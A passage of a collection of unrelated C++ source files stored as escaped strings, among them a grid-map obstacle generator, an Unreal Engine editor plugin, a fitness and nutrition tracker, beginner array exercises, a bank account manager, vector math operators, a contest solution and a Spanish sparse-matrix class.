 double radius_max) {\n  // radius_min = std::min(m_length, m_width) / 25;\n  // radius_max = std::max(m_length, m_width) / 10;\n  // circle_num = 10;\n\n  std::random_device rd; // \u83b7\u53d6\u786c\u4ef6\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u79cd\u5b50\n  std::mt19937 gen(rd()); // \u4f7f\u7528\u6885\u68ee\u65cb\u8f6c\u7b97\u6cd5\uff08Mersenne Twister\uff09\u751f\u6210\u968f\u673a\u6570\n  std::uniform_int_distribution<> dis(1, 1000); // \u5b9a\u4e49\u968f\u673a\u6570\u8303\u56f4\u4e3a1\u52301000\n  std::vector<grid_map::Position> centers;\n  auto tooclose = [&centers,\n                   radius_max](grid_map::Position cur_center) -> bool {\n    for (auto center : centers) {\n      double dis = sqrt(pow(center.x() - cur_center.x(), 2) +\n                        pow(center.y() - cur_center.y(), 2));\n      if (dis < 1.5 * radius_max) {\n        return true;\n      }\n    }\n    return false;\n  };\n  for (int i = 0; i < circle_num; i++) {\n    // \u9996\u5148\u51b3\u5b9a\u534a\u5f84\n    double radius = radius_min + dis(gen) / 1000.0 * (radius_max - radius_min);\n    // \u5176\u6b21\u51b3\u5b9a\u5706\u5fc3\u4f4d\u7f6e\n    grid_map::Position cur_center;\n    cur_center.x() = dis(gen) / 1000.0 * m_length - m_length / 2;\n    cur_center.y() = dis(gen) / 1000.0 * m_width - m_width / 2;\n    if (tooclose(cur_center)) {\n      i--;\n      continue;\n    }\n    centers.push_back(cur_center);\n    // \u51b3\u5b9a\u662f\u4ec0\u4e48\u5f62\u72b6\uff0c\u53ef\u9009\u9879\u6709circle\n    int seed = dis(gen);\n    if (seed < 300) {\n      for (grid_map::CircleIterator iterator(m_grid_map, cur_center, radius);\n           !iterator.isPastEnd(); ++iterator) {\n        m_grid_map.at(\"elevation\", *iterator) = 1.5;\n      }\n    } else if (300 <= seed && seed < 400) {\n      grid_map::Length length(2 * radius * dis(gen) / 1000.0,\n                              2 * radius * dis(gen) / 1000.0);\n      for (grid_map::EllipseIterator iterator(m_grid_map, cur_center, length,\n                                              dis(gen) / 1000.0 * M_PI * 2);\n           !iterator.isPastEnd(); ++iterator) {\n        m_grid_map.at(\"elevation\", *iterator) = 1.5;\n      }\n    } else if (400 <= seed && seed < 600) {\n      for (grid_map::SpiralIterator iterator(m_grid_map, cur_center, radius);\n           !iterator.isPastEnd(); ++iterator) {\n        m_grid_map.at(\"elevation\", *iterator) = 1.5;\n      }\n    } else if (600 <= seed && seed < 650) {\n      double theta = 2 * M_PI * dis(gen) / 1000.0;\n      grid_map::Position start(cur_center.x() + radius * cos(theta),\n                               cur_center.y() + radius * sin(theta));\n      grid_map::Position end(cur_center.x() - radius * cos(theta),\n                             cur_center.y() - radius * sin(theta));\n      for (grid_map::LineIterator iterator(m_grid_map, start, end);\n           !iterator.isPastEnd(); ++iterator) {\n        m_grid_map.at(\"elevation\", *iterator) = 1.5;\n      }\n    } else if (650 <= seed && seed <= 1000) {\n      int polygon_num = dis(gen) % 4 + 3;\n      double theta_per = 2 * M_PI / polygon_num;\n      grid_map::Polygon polygon;\n      for (int i = 0; i <= polygon_num; i++) {\n        double theta = i * theta_per;\n        polygon.addVertex(\n            grid_map::Position(cur_center.x() + radius * cos(theta),\n                               cur_center.y() ",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"Goby.h\"\n#include \"GobyStyle.h\"\n#include \"GobyCommands.h\"\n#include \"LevelEditor.h\"\n#include \"Widgets/Docking/SDockTab.h\"\n#include \"Widgets/Layout/SBox.h\"\n#include \"Widgets/Text/STextBlock.h\"\n#include \"ToolMenus.h\"\n#include \"GobyWidget.h\"\n\n\nstatic const FName GobyTabName(\"Goby\");\n\n#define LOCTEXT_NAMESPACE \"FGobyModule\"\n\nvoid FGobyModule::StartupModule()\n{\n\tFGobyStyle::Initialize();\n\tFGobyStyle::ReloadTextures();\n\n\tFGobyCommands::Register();\n\t\n\tPluginCommands = MakeShareable(new FUICommandList);\n\n\tPluginCommands->MapAction(\n\t\tFGobyCommands::Get().OpenPluginWindow,\n\t\tFExecuteAction::CreateRaw(this, &FGobyModule::PluginButtonClicked),\n\t\tFCanExecuteAction());\n\n\tUToolMenus::RegisterStartupCallback(FSimpleMulticastDelegate::FDelegate::CreateRaw(this, &FGobyModule::RegisterMenus));\n\t\n\tFGlobalTabmanager::Get()->RegisterNomadTabSpawner(GobyTabName, FOnSpawnTab::CreateRaw(this, &FGobyModule::OnSpawnPluginTab))\n\t\t.SetDisplayName(LOCTEXT(\"FGobyTabTitle\", \"Goby\"))\n\t\t.SetMenuType(ETabSpawnerMenuType::Hidden);\n}\n\nvoid FGobyModule::ShutdownModule()\n{\n\tUToolMenus::UnRegisterStartupCallback(this);\n\n\tUToolMenus::UnregisterOwner(this);\n\n\tFGobyStyle::Shutdown();\n\n\tFGobyCommands::Unregister();\n\n\tFGlobalTabmanager::Get()->UnregisterNomadTabSpawner(GobyTabName);\n}\n\nTSharedRef<SDockTab> FGobyModule::OnSpawnPluginTab(const FSpawnTabArgs& SpawnTabArgs)\n{\n\treturn SNew(SDockTab)\n\t\t.TabRole(ETabRole::NomadTab)\n\t\t[\n\t\t\tSNew(SBox)\n\t\t\t.HAlign(HAlign_Fill)\n\t\t\t.VAlign(VAlign_Fill)\n\t\t\t[\n\t\t\t\tSNew(SGobyWidget)\n\t\t\t]\n\t\t];\n}\n\nvoid FGobyModule::PluginButtonClicked()\n{\n\tFGlobalTabmanager::Get()->TryInvokeTab(GobyTabName);\n}\n\nvoid FGobyModule::RegisterMenus()\n{\n\t// Owner will be used for cleanup in call to UToolMenus::UnregisterOwner\n\tFToolMenuOwnerScoped OwnerScoped(this);\n\n\t{\n\t\tUToolMenu* Menu = UToolMenus::Get()->ExtendMenu(\"LevelEditor.MainMenu.Window\");\n\t\t{\n\t\t\tFToolMenuSection& Section = Menu->FindOrAddSection(\"WindowLayout\");\n\t\t\tSection.AddMenuEntryWithCommandList(FGobyCommands::Get().OpenPluginWindow, PluginCommands);\n\t\t}\n\t}\n\n\t{\n\t\tUToolMenu* ToolbarMenu = UToolMenus::Get()->ExtendMenu(\"LevelEditor.LevelEditorToolBar.User\");\n\t\t{\n\t\t\tFToolMenuSection& Section = ToolbarMenu->FindOrAddSection(\"Goby\");\n\t\t\t{\n\t\t\t\tFToolMenuEntry& Entry = Section.AddEntry(FToolMenuEntry::InitToolBarButton(FGobyCommands::Get().OpenPluginWindow));\n\t\t\t\tEntry.SetCommandList(PluginCommands);\n\t\t\t\tEntry.StyleNameOverride = FName(\"CalloutToolbar\");\n\t\t\t}\n\t\t}\n\t}\n}\n\n#undef LOCTEXT_NAMESPACE\n\t\nIMPLEMENT_MODULE(FGobyModule, Goby)",
    "#include <iostream>\n#include <string>\n#include <algorithm>\n#include <vector>\n#include <fstream>\nusing namespace std;\n\nstruct exercisedata {\n    string name;\n    int stabilitydemand;\n    int cooperatingandcompounddemand;\n    int abilitytoreachfailure;\n};\n\nenum class Unit {\n    tbsp,\n    liter,\n    quantity,\n    hundred_grams,\n};\nenum class GoalType {\n    Hypertrophy,\n    Sports,\n    Hybrid,\n    Powerlifting,\n    EnduranceSports\n};\n\nstruct Exercise {\n    string name;\n    int sets;\n    int reps;\n};\nstruct FoodGoal {\n    int calories;\n    int protein;\n    int carbohydrated;\n    int fats;\n};\n\nstruct Food {\n    string name;\n    int index;\n    Unit unit;\n    int calories;\n    int protein;\n    int carbohydrates;\n    int fats;\n};\n\nstruct Uservariables\n{\n    int leveloftraining;\n    GoalType goal;\n    bool gender;\n    int weightinkg;\n    int heightincm;\n    int age;\n};\n\nstring GoalToString(GoalType goal) {\n    switch (goal) {\n    case GoalType::Hypertrophy: return \"Hypertrophy\";\n    case GoalType::Sports: return \"Sports\";\n    case GoalType::Hybrid: return \"Hybrid\";\n    case GoalType::Powerlifting: return \"Powerlifting\";\n    case GoalType::EnduranceSports: return \"Endurance Sports\";\n    default:\n        return \"Unknown Goal\";\n    }\n}\n\nGoalType stringToGoal(const std::string& goalStr) {\n    if (goalStr == \"Hypertrophy\") return GoalType::Hypertrophy;\n    if (goalStr == \"Sports\") return GoalType::Sports;\n    if (goalStr == \"Hybrid\") return GoalType::Hybrid;\n    if (goalStr == \"Powerlifting\") return GoalType::Powerlifting;\n    if (goalStr == \"Endurance Sports\") return GoalType::EnduranceSports;\n    throw std::invalid_argument(\"Unknown goal string\");\n}\n\nstring unitToString(Unit unit) {\n    switch (unit) {\n    case Unit::hundred_grams: return \"100g\";\n    case Unit::tbsp: return \"tbsp\";\n    case Unit::liter: return \"liter\";\n    case Unit::quantity: return \"quantity\";\n    default: return \"unknown\";\n    }\n}\nUnit stringToUnit(const string& unitStr) {\n    if (unitStr == \"100g\") return Unit::hundred_grams;\n    if (unitStr == \"tbsp\") return Unit::tbsp;\n    if (unitStr == \"liter\") return Unit::liter;\n    if (unitStr == \"quantity\") return Unit::quantity;\n    throw invalid_argument(\"Unknown unit string\");\n}\n\nFood foodlist[50] = {\n    // Meats\n    {\"Chicken Breast\", 1, Unit::hundred_grams, 165, 31, 0, 3.6},\n    {\"Beef\", 2, Unit::hundred_grams, 250, 26, 0, 17},\n    {\"Pork\", 3, Unit::hundred_grams, 242, 27, 0, 14},\n    {\"Salmon\", 4, Unit::hundred_grams, 208, 22, 0, 13},\n    {\"Turkey\", 5, Unit::hundred_grams, 135, 30, 0, 1.5},\n\n    // Grains\n    {\"Rice\", 6, Unit::hundred_grams, 130, 2.7, 28, 0.3},\n    {\"Oats\", 7, Unit::hundred_grams, 389, 16.9, 66.3, 6.9},\n    {\"Quinoa\", 8, Unit::hundred_grams, 120, 4.1, 21.3, 1.9},\n    {\"Barley\", 9, Unit::hundred_grams, 354, 12, 73.5, 2.3},\n    {\"Wheat\", 10, Unit::hundred_grams, 339, 13, 71, 2.5},\n\n    // Fruits\n    {\"Apple\", 11, Unit::quantity, 95, 0.5, 25, 0.3},\n    {\"Banana\", 12, Unit::quantity, 105, 1.3, 27, 0.3},\n    {\"Orange\", 13, Unit::quantity, 62, 1.2, 15.4, 0.2},\n    {\"Strawberries\", 14, Unit::hundred_grams, 32, 0.8, 7.7, 0.3},\n    {\"Blueberries\", 15, Unit::hundred_grams, 57, 0.7, 14.5, 0.3},\n\n    // Dry Fruits\n    {\"Almonds\", 16, Unit::hundred_grams, 579, 21.2, 21.6, 49.9},\n    {\"Cashews\", 17, Unit::hundred_grams, 553, 18.2, 30.2, 43.8},\n    {\"Walnuts\", 18, Unit::hundred_grams, 654, 15.2, 13.7, 65.2},\n    {\"Pistachios\", 19, Unit::hundred_grams, 562, 20.2, 28, 45},\n    {\"Dates\", 20, Unit::hundred_grams, 277, 1.8, 75, 0.2},\n\n    // Fast Foods\n    {\"Burger\", 21, Unit::quantity, 354, 17, 30, 20},\n    {\"Pizza\", 22, Unit::quantity, 285, 12, 36, 10},\n    {\"Fries\", 23, Unit::hundred_grams, 312, 3.4, 41.4, 15},\n    {\"Fried Chicken\", 24, Unit::quantity, 400, 28, 12, 24},\n    {\"Hot Dog\", 25, Unit::quantity, 150, 5, 1, 13},\n\n    // Vegetables\n    {\"Broccoli\", 26, Unit::hundred_grams, 34, 2.8, 6.6, 0.4},\n    {\"Spinach\", 27, Unit::hundred_grams, 23, 2.9, 3.6, 0.4},\n    {\"Carrot\", 28, Unit::hundred_grams, 41, 0.9, 9.6, 0.2},\n    {\"Potato\", 29, Unit::hundred_grams, 77, 2, 17, 0.1},\n    {\"Tomato\", 30, Unit::hundred_grams, 18, 0.9, 3.9, 0.2},\n\n    // Dairy\n    {\"Milk\", 31, Unit::liter, 42, 3.4, 4.8, 1},\n    {\"Cheese\", 32, Unit::hundred_grams, 402, 25, 1.3, 33},\n    {\"Yogurt\", 33, Unit::hundred_grams, 59, 3.5, 4.1, 3.3},\n    {\"Butter\", 34, Unit::hundred_grams, 717, 0.9, 0.1, 81},\n    {\"Ice Cream\", 35, Unit::hundred_grams, 207, 3.5, 24, 11},\n\n    // Miscellaneous\n    {\"Eggs\", 36, Unit::quantity, 68, 6, 0.6, 4.8},\n    {\"Tofu\", 37, Unit::hundred_grams, 144, 15.7, 1.9, 8.0},\n    {\"Peanut Butter\", 38, Unit::tbsp, 94, 3.6, 3.2, 8.0},\n    {\"Honey\", 39, Unit::tbsp, 64, 0.1, 17.3, 0},\n    {\"Olive Oil\", 40, Unit::tbsp, 119, 0, 0, 13.5},\n\n    // Beans & Legumes\n    {\"Black Beans\", 41, Unit::hundred_grams, 339, 21.6, 62.4, 0.9},\n    {\"Lentils\", 42, Unit::hundred_grams, 353, 25.8, 63.3, 1.1},\n    {\"Chickpeas\", 43, Unit::hundred_grams, 364, 19.3, 60.6, 6.0},\n    {\"Kidney Beans\", 44, Unit::hundred_grams, 333, 23.6, 60.4, 0.8}",
    " ////Create an Integer Array (Student) with size of 56\n#include<bits/stdc++.h>\nusing namespace std;\n// // // // int main(){\n// // // //     int student_marks[56]={99,94,92,79,86};\n// // // //     for (int i = 0; i < 5; i++)\n// // // //     {\n// // // //         cout<<student_marks[i]<<\" \"<<endl;\n// // // //     }\n// // // //     for(int j=0 ;j< 5;j++){\n// // // //         cout<<\"The Double of \"<<student_marks[j]<<\" is : \"<<2*student_marks[j]<<endl;\n// // // //     }\n    \n    \n// // // // }\n// // // // bool find(int arr[], int size, int key){\n// // //     //     for (int i = 0; i < size; i++)\n// // //     //     {\n// // //     //         if(arr[i]==key){\n// // //     //             return true;\n// // //     //         }\n// // //     //     }\n// // //     //     return false;\n        \n// // //     // }\nint main(){\n// // //     // int arr[5]= {1,2,3,4,5};\n// //     // memset(arr, 0,sizeof(arr)); //replace value by 0 using memset function\n// // //     // for (int i = 0; i < 5; i++)\n// // //     // {\n// // //     //     cout<<arr[i]<<\" \"; \n// // //     // }\n// // //     // int n;\n// // //     // int zeros = 0;\n// // //     // int ones=0;\n// // //     int arr[]={1,7,0,4,1,5,1,1,8,18,0,2,9,0};\n// // //     int max = arr[0];\n// // //     // Maximum No.\n// // //     for (int i = 1; i < sizeof(arr)/sizeof(int); i++)\n// // //     {\n// // //         if(max<arr[i]){\n// // //             max= arr[i];\n// // //         }\n// // //     }\n// // //     cout<<max<<endl;\n\n// // //     // for (int i = 0; i < sizeof(arr)/sizeof(int); i++)\n// // //     // {\n// // //     //     if (arr[i] == 0)\n// // //     //     {\n// // //     //         zeros++;\n// // //     //     }\n// // //     //     if(arr[i]==1){\n// // //     //         ones++;\n// // //     //     }\n        \n// // //     // }\n// // //     // cout<<zeros<<endl;\n// // //     // cout<<ones<<endl; \n\n// // //     // for (int i = 0; i < 7; i++)\n// // //     // {\n// // //     //     if(arr[i]==n){\n// // //     //         cout<<\"Present in \"<<i<<\" index\";\n// // //     //         break;\n// // //     //     }\n// // //     //     else\n// // //     //     {\n// // //     //         continue;\n// // //     //     }\n// // //     // }\n    \n// // //     // bool flag = find(arr, 7, n);\n// // //     // if (flag )\n// // //     // {\n// // //     //     cout<<\"found\";\n// // //     // }\n// // //     // else\n// // //     // {\n// // //     //     cout<<\"absent\";\n// // //     // }\n// // // cout<<\"Enter the size of an array - \";\n// // // int n;\n// // // cin>>n;\n// // // int arr[n];\n// // // cout<<\"Enter The element of an array: \"<<endl;\n// // // for (int i = 0; i < n; i++)\n// // // {\n// // //     cin>>arr[i];\n// // // }\n// // // string minmax;\n// // // cout<<\"To find out Min or Max :- \";\n// // // cin>>minmax;\n\n// // // if (minmax == \"Max\")\n// // // {\n// // //     int max=INT_MIN;\n// // //     for (int i = 0; i < n; i++)\n// // //     {\n// // //         if (arr[i] > max)\n// // //         {\n// // //             max = arr[i];\n// // //         }\n        \n// // //     }\n// // //     cout<<\"The Maximum is \"<<max<<endl;\n// // // }\n// // // if(minmax == \"Min\"){\n// // //     int min = INT_MAX;\n// // //     for (int i = 1; i < n; i++)\n// // //     {\n// // //         if (arr[i] < min)\n// // //         {\n// // //             min = arr[i];\n// // //         }\n        \n// // //     }\n// // //     cout<<\"The Minimum Is \"<<min<<endl;\n    \n// // // }\n\n\n// // }\n\n// // Reverse an Array.\n// #include<bits/stdc++.h>\n// using namespace std;\n// int main(){\n//     cout<<\"Enter The Size of an Array : \";\n//     int n;\n//     cin>>n;\n//     int arr[n];\n//     cout<<\"Enter the Elements : \";\n//     for (int i = 0; i < n; i++)\n//     {\n//         cin>>arr[i];\n//     }\n\n//     int start = 0;\n//     int end = n-1;\n//     int temp;\n//     while (start<=end)\n//     {\n//         temp = arr[start];\n//         arr[start] = arr[end];\n//         arr[end] = temp;\n        \n//         start++;\n//         end--;\n//     }\n//     for (int i = 0; i < n; i++)\n//     {\n//         cout<<arr[i]<<\" \";\n//     }\n    cout<<\"Enter the rows and columns size: \";\n    int rows,cols;\n    cin>>rows>>cols;\n    int arr[rows][cols];\n    cout<<\"Enter the element row- wise: \"<<endl;\n    for (int i = 0; i < rows; i++)\n    {\n        for (int j = 0; j < cols; j++)\n        {\n            cin>>arr[i][j];\n        }\n    }\n    cout<<\"Now, Printing the arrays: \"<<endl;;\n    for(int i = 0; i < rows; i++)\n    {\n        for (int j = 0; j < cols; j++)\n        {\n            cout<<arr[i][j]<<\" \";\n        }\n        cout<<endl;\n    }\n    \n\n    \n }",
    "#include \"AccountManager.h\"\n\nAccountManager::AccountManager()\n    : next_account_ID_(1) {\n    std::cout << \"AccountManager initialized by default constructor with ID: \" << next_account_ID_ << \"\\n\";\n}\n\nAccountManager::AccountManager(int next_account_ID)\n    : next_account_ID_(next_account_ID) {\n    std::cout << \"AccountManager initialized with next account ID: \" << next_account_ID_ << \"\\n\";\n}\n\nstd::list<Account*>* AccountManager::get_accounts_list() {\n    return &accounts_list_;  // Return reference to the original list\n}\n\nint AccountManager::get_next_account_ID() const {\n    return next_account_ID_;\n}\n\nvoid AccountManager::add_account(int account_owner_ID) {\n    std::string account_type;\n    account_type = \"deposit\";\n    Account* new_account = new Account(next_account_ID_, account_owner_ID, 0, account_type);\n    accounts_list_.push_back(new_account);\n    std::cout << \"Account with ID: \" << next_account_ID_ << \" created for client ID: \" << account_owner_ID << std::endl;\n    ++next_account_ID_;\n}\n\nvoid AccountManager::delete_account(int account_ID) {\n    for (auto it = accounts_list_.begin(); it != accounts_list_.end(); ++it) {\n        if ((*it)->get_account_ID() == account_ID) {\n            delete* it;  // Delete the Account object pointed to by the pointer\n            *it = nullptr;  // Assign nullptr to avoid using a deleted pointer\n            accounts_list_.erase(it);  // Remove the pointer from the list\n            std::cout << \"Account with ID: \" << account_ID << \" deleted.\\n\";\n            return;\n        }\n    }\n    std::cout << \"Account with ID: \" << account_ID << \" not found.\\n\";\n}\n\nAccount* AccountManager::find_account_by_ID(int account_ID) const {\n    // Iterate through the list of accounts using a range-based for loop or an iterator\n    for (Account* account : accounts_list_) {\n        // Check if the current account ID matches the required ID\n        if (account->get_account_ID() == account_ID) {\n            return account; // Return pointer to the found account\n        }\n    }\n    // If the account with the specified ID is not found, return nullptr\n    return nullptr;\n}\n\nvoid AccountManager::show_account_details(int account_ID) const {\n    Account* account = find_account_by_ID(account_ID);\n    if (account) {\n        std::cout << \"-------------------------\\n\";\n        std::cout << \"Account ID: \" << account->get_account_ID()\n            << \"\\nAccount owner ID: \" << account->get_account_owner_ID()\n            << \"\\nAccount type: \" << account->get_account_type()\n            << \"\\nAccount balance: \" << account->get_account_balance() << \"$\\n\";\n        std::cout << \"-------------------------\\n\";\n    }\n    else {\n        std::cout << \"Account with ID: \" << account_ID << \" not found.\\n\";\n    }\n}\n\n// Show all accounts\nvoid AccountManager::show_all_accounts() const {\n    if (accounts_list_.empty()) {\n        std::cout << \"No accounts to display.\\n\";\n        return;\n    }\n    std::cout << \"List of all accounts:\\n\";\n    for (const Account* account : accounts_list_) {\n        show_account_details(account->get_account_ID()); // Call the method to display account details\n    }\n}\n\nvoid AccountManager::deposit(int account_ID, double amount) {\n    Account* account = find_account_by_ID(account_ID);\n    double current_balance = account->get_account_balance();\n    account->set_account_balance(current_balance += amount);\n}\n\nvoid AccountManager::withdraw(int account_ID, double amount) {\n    Account* account = find_account_by_ID(account_ID);\n    double current_balance = account->get_account_balance();\n    account->set_account_balance(current_balance -= amount);\n}\n",
    "#include \"vectors.h\"\r\n#include <cmath>\r\n\r\nbool operator==(const vec3& v1, const vec3& v2)\r\n{\r\n\tvec3 v = v1 - v2;\r\n\tif (abs(v.x) >= EPSILON)\r\n\t\treturn false;\r\n\tif (abs(v.y) >= EPSILON)\r\n\t\treturn false;\r\n\tif (abs(v.z) >= EPSILON)\r\n\t\treturn false;\r\n\treturn true;\r\n}\r\n\r\nbool operator!=(const vec3& v1, const vec3& v2)\r\n{\r\n\tvec3 v = v1 - v2;\r\n\tif (abs(v.x) >= EPSILON)\r\n\t\treturn true;\r\n\tif (abs(v.y) >= EPSILON)\r\n\t\treturn true;\r\n\tif (abs(v.z) >= EPSILON)\r\n\t\treturn true;\r\n\treturn false;\r\n}\r\n\r\nvec3 operator-(vec3 v1, const vec3& v2)\r\n{\r\n\tv1.x -= v2.x;\r\n\tv1.y -= v2.y;\r\n\tv1.z -= v2.z;\r\n\treturn v1;\r\n}\r\n\r\nvec3 operator+(vec3 v1, const vec3& v2)\r\n{\r\n\tv1.x += v2.x;\r\n\tv1.y += v2.y;\r\n\tv1.z += v2.z;\r\n\treturn v1;\r\n}\r\n\r\nvec3 operator*(vec3 v1, const vec3& v2)\r\n{\r\n\tv1.x *= v2.x;\r\n\tv1.y *= v2.y;\r\n\tv1.z *= v2.z;\r\n\treturn v1;\r\n}\r\n\r\nvec3 operator/(vec3 v1, const vec3& v2)\r\n{\r\n\tv1.x /= v2.x;\r\n\tv1.y /= v2.y;\r\n\tv1.z /= v2.z;\r\n\treturn v1;\r\n}\r\n\r\nvec3 operator-(vec3 v, float f)\r\n{\r\n\tv.x -= f;\r\n\tv.y -= f;\r\n\tv.z -= f;\r\n\treturn v;\r\n}\r\n\r\nvec3 operator+(vec3 v, float f)\r\n{\r\n\tv.x += f;\r\n\tv.y += f;\r\n\tv.z += f;\r\n\treturn v;\r\n}\r\n\r\nvec3 operator*(vec3 v, float f)\r\n{\r\n\tv.x *= f;\r\n\tv.y *= f;\r\n\tv.z *= f;\r\n\treturn v;\r\n}\r\n\r\nvec3 operator/(vec3 v, float f)\r\n{\r\n\tv.x /= f;\r\n\tv.y /= f;\r\n\tv.z /= f;\r\n\treturn v;\r\n}\r\n\r\nvoid vec3::operator-=(const vec3& v)\r\n{\r\n\tx -= v.x;\r\n\ty -= v.y;\r\n\tz -= v.z;\r\n}\r\n\r\nvoid vec3::operator+=(const vec3& v)\r\n{\r\n\tx += v.x;\r\n\ty += v.y;\r\n\tz += v.z;\r\n}\r\n\r\nvoid vec3::operator*=(const vec3& v)\r\n{\r\n\tx *= v.x;\r\n\ty *= v.y;\r\n\tz *= v.z;\r\n}\r\n\r\nvoid vec3::operator/=(const vec3& v)\r\n{\r\n\tx /= v.x;\r\n\ty /= v.y;\r\n\tz /= v.z;\r\n}\r\n\r\nvoid vec3::operator-=(float f)\r\n{\r\n\tx -= f;\r\n\ty -= f;\r\n\tz -= f;\r\n}\r\n\r\nvoid vec3::operator+=(float f)\r\n{\r\n\tx += f;\r\n\ty += f;\r\n\tz += f;\r\n}\r\n\r\nvoid vec3::operator*=(float f)\r\n{\r\n\tx *= f;\r\n\ty *= f;\r\n\tz *= f;\r\n}\r\n\r\nvoid vec3::operator/=(float f)\r\n{\r\n\tx /= f;\r\n\ty /= f;\r\n\tz /= f;\r\n}\r\n\r\nfloat vec3::length()\r\n{\r\n\treturn sqrt((x * x) + (y * y) + (z * z));\r\n}\r\n\r\nbool vec3::IsZero()\r\n{\r\n\treturn (abs(x) + abs(y) + abs(z)) < EPSILON;\r\n}\r\n\r\nstd::string vec3::toString()\r\n{\r\n\treturn std::to_string(x) + \" \" + std::to_string(y) + \" \" + std::to_string(z);\r\n}\r\n\r\nstd::string vec3::toKeyvalueString(bool truncate, const std::string& suffix_x, const std::string& suffix_y, const std::string& suffix_z)\r\n{\r\n\tstd::string parts[3] = {std::to_string(x) ,std::to_string(y), std::to_string(z)};\r\n\r\n\t// remove trailing zeros to save some space\r\n\tfor (int i = 0; i < 3; i++)\r\n\t{\r\n\t\tif (truncate)\r\n\t\t{\r\n\t\t\tparts[i] = parts[i].substr(0, parts[i].find('.') + 3);\r\n\t\t}\r\n\r\n\t\tparts[i].erase(parts[i].find_last_not_of('0') + 1, std::string::npos);\r\n\r\n\t\t// strip dot if there's no fractional part\r\n\t\tif (parts[i][parts[i].size() - 1] == '.')\r\n\t\t{\r\n\t\t\tparts[i] = parts[i].substr(0, parts[i].size() - 1);\r\n\t\t}\r\n\t}\r\n\r\n\treturn parts[0] + suffix_x + parts[1] + suffix_y + parts[2] + suffix_z;\r\n}\r\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nint main() {\n\tios::sync_with_stdio(false);\n\tcin.tie(0);\n\n#ifndef ONLINE_JUDGE\n\tfreopen(\"input.txt\", \"r\", stdin);\n\tfreopen(\"output.txt\", \"w\", stdout);\n#endif\n\n\tint t;\n\tcin >> t;\n\n\tfor (int j {1}; j <= t; ++j) {\n\n\t\tint n;\n\n\t\tcin >> n;\n\n\t\tvector<pair<int, int>> edges;\n\n\t\tfor (int i {0}; i < n - 1; ++i) {\n\t\t\tint f1;\n\t\t\tint f2;\n\n\t\t\tcin >> f1 >> f2;\n\n\t\t\t// f1--;\n\t\t\t// f2--;\n\n\t\t\tedges.emplace_back(f1, f2);\n\n\t\t}\n\n\t\tif (n <= 2) {\n\t\t\tcout << \"Case #\" << j << \": \" << 1 << endl;\n\t\t\tcontinue;\n\t\t}\n\n\t\tint cnt {0};\n\n\t\twhile (!edges.empty()) {\n\n\t\t\tvector<int> in(n, 0);\n\t\t\tvector<vector<int>> paths (n, vector<int>());\n\t\t\tint mx {0};\n\n\t\t\tfor (auto [a, b] : edges) {\n\t\t\t\tpaths[a].push_back(b);\n\t\t\t\tpaths[b].push_back(a);\n\t\t\t\tin[a]++;\n\t\t\t\tin[b]++;\n\t\t\t\tif (a > mx) {\n\t\t\t\t\tmx = a;\n\t\t\t\t}\n\t\t\t\tif (b > mx) {\n\t\t\t\t\tmx = b;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (edges.size() == 1) {\n\t\t\t\tcnt++;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tvector<int> rem;\n\n\t\t\tfor (int u {0}; u <= mx; ++u) {\n\t\t\t\tif (in[u] == 1) {\n\t\t\t\t\tcnt++;\n\t\t\t\t\trem.push_back(u);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tvector<int> addToRem;\n\t\t\tfor (auto u : rem) {\n\t\t\t\tfor (int v : paths[u]) {\n\t\t\t\t\tif (find(rem.begin(), rem.end(), v) != rem.end()) { continue; }\n\t\t\t\t\taddToRem.push_back(v);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfor (auto u : addToRem) {\n\t\t\t\trem.push_back(u);\n\t\t\t}\n\n\t\t\tvector<int> toErase;\n\t\t\tvector<int> partNotIn;\n\n\t\t\tfor (int u {0}; u < edges.size(); ++u) {\n\t\t\t\tpair<int, int> p {edges[u]};\n\t\t\t\tcout << p.first << \" \" << p.second << \" \" << u << endl;\n\t\t\t\tint addToCnt {2};\n\n\t\t\t\tif (find(rem.begin(), rem.end(), p.first) != rem.end()) {\n\t\t\t\t\taddToCnt--;\n\t\t\t\t} else {\n\t\t\t\t\tpartNotIn.push_back(p.first);\n\t\t\t\t}\n\n\t\t\t\tif  (find(rem.begin(), rem.end(), p.second) != rem.end()) {\n\t\t\t\t\taddToCnt--;\n\t\t\t\t} else {\n\t\t\t\t\tpartNotIn.push_back(p.second);\n\t\t\t\t}\n\n\t\t\t\tif (addToCnt != 2) { toErase.push_back(u); }\n\t\t\t}\n\n\t\t\tset<int> s(partNotIn.begin(), partNotIn.end());\n\t\t\tcnt += (partNotIn.size() - (partNotIn.size() - s.size()) * 2);\n\n\t\t\tsort(toErase.begin(), toErase.end());\n\n\t\t\tint cntErase {0};\n\t\t\tfor (auto u : toErase) {\n\t\t\t\tedges.erase(next(edges.begin(), u - cntErase));\n\t\t\t\tcntErase++;\n\t\t\t}\n\t\t}\n\n\t\tcout << \"Case #\" << j << \": \" << cnt << endl;\n\n\t}\n\n\treturn 0;\n}",
    "// Matriz_Poco_Poblada.cpp : Este archivo contiene la funci\u00f3n \"main\". La ejecuci\u00f3n del programa comienza y termina ah\u00ed.\n//\n\n#include <iostream>\n#include <map>\n\nusing namespace std;\n\n// CLASE PARA REPRESENTAR UNA MATRIZ DISPERSA...\n\nclass matrizDispersa {\nprivate:\n    map<pair<int, int>, int> elementos; // MAPA PARA ALMACENAR VALORES DISTINTOS DE CERO.\n    int filas, columnas;\n\npublic:\n\n    // CONSTRUCTOR...\n\n    matrizDispersa(int filas, int columnas) : filas(filas), columnas(columnas) {}\n\n    // M\u00c9TODO PARA ASIGNAR UN VALOR...\n\n    void asignarValor(int fila, int columna, int valor)\n    {\n        if (fila < 0 || fila >= filas || columna < 0 || columna >= columnas)\n        {\n            cout << \"VALOR FUERA DEL INTERVALO\" << endl;\n            return;\n        }\n\n        if (valor != 0)\n        {\n            elementos[{fila, columna}] = valor; // ALMACENA S\u00d3LO VALORES DISTINTOS DE 0.\n        }\n        else \n        {\n            elementos.erase({ fila, columna }); // ELIMINA S\u00d3LO VALORES IGUALES A 0.\n        }\n    }\n\n    // M\u00c9TODO PARA OBTENER UN VALOR...\n\n    int get(int fila, int columna) const\n    {\n        if (fila < 0 || fila >= filas || columna < 0 || columna >= columnas)\n        {\n            cout << \"VALOR FUERA DEL INTERVALO!!!!!\" << endl;\n            